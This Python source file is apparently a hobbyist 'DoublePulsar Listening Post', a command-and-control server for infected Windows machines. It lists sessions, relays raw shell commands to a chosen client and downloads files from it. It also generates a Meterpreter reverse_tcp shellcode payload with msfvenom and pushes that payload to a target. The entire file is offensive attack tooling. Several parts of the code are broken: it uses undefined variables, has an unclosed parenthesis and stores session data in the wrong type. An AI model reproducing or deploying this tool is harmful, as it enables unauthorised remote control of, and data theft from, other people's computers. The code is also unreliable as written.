## DoublePulsar Listening Post
## Version 1.0
## By ShowNadda
# Information:
# This version has shellcode injection, file upload/download, and raw command execution through window's command prompt.
# This Listening Post needs to be run on Kali Linux
##

## Global Imports
import socket
import subprocess
import time
import _thread
from _thread import *
from time import *

sock_obj = []
sock_ip_port = []

# Creates and defines the Global Variable for Threading
def threaded(c):
    print("Opened a new thread from client : " + str(clientip[0]))
    while 1:
        data = c.recv(1024)
        if not data:
            print("Connection was closed by client")
            break
    print("Received %s from Client" % (data))
    c.send(data)

## Payload will need to be fixed but this works. 
def download(file, socket):
    output = socket.recv(2048)
    file_name = file.split("\\")[-1]
    with open(file_name, "wb") as f:
        f.write(output)
    f.close()
    print("[!] File successfully transferred!!!")

def send_shellcode():
    rev_ip = input("[>] Enter Reverse IP: ")
    rev_port = input("[>] Enter reverse PORT: ")
    print("[*] Please wait while shellcode is being created...")
    shellcmd = "msfvenom --platform windows --payload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw >shellcode.bin 2>/dev/null" % (rev_ip, rev_port)
    shelloutput = subprocess.check_output(shellcmd, shell=True)
    print("[!] Done!")
    print("[>] Reading shellcode from binary file...")
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()

    client_list()
    target = input("[>] Select which target will receive the shellcode")
    for x in sock_obj:
        for num, sock in x.items():
            if target == str(num):
                sock.send("shellcode")
                print("[!] Sending Shellcode...")
                sleep(1)
                sock.send(shellcode)
                print("[*] Shellcode sent!")

def cmd_client(client_num, data):
    for x in sock_obj:
        for num, sock in x.items():
            if client_num == str(num):
                sock.send(data)

# Creates and defines the client list command
def client_list():
    print("[+]------------------[+]")
    for conn in sock_ip_port:
        for sock_num, ip_port, in conn.items():
            for ip, port in ip_port.items():
                print("[>] {}: {} {}".format(sock_num, ip, port))
    print("[+]------------------[+]")

# Creates and defines the command prompt for the Host connecting to Client's Terminal
def CMD():
    while 1:
        cmd = input("FB[*]: ")
        if cmd == "":
            continue
        elif cmd == "sessions":
            client_list()
        elif "-i" in cmd:
            sock_num = cmd.split(" ")[2]
            cmd_to_send = input("[>] Sessions {} > ".format(sock_num))
            cmd_client(sock_num, cmd_to_send)

# Creates and defines the Global Variable "server"
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Binds and Listens on Port 8888
server.bind(("127.0.0.1", 8888))
server.listen()
print("[!] FuzzBunch is now Listening on Port 8888!")

# For being able to list and control particular sessions
conn_num = 0
start_new_thread(CMD, ())
# Main While Loop, so clients can connect and receive commands
while 1:
    clients, clientip = server.accept()
    conn_num += 1
    sock_obj.append({conn_num:c})
    conn_ip = str(addr[0])
    conn_port = str(addr[1])
    sock_ip_port.append({conn_num:{conn_ip}})

    print ("[!] Client has connected from :" + str(clientip[0])
    start_new_thread(threaded, (c,))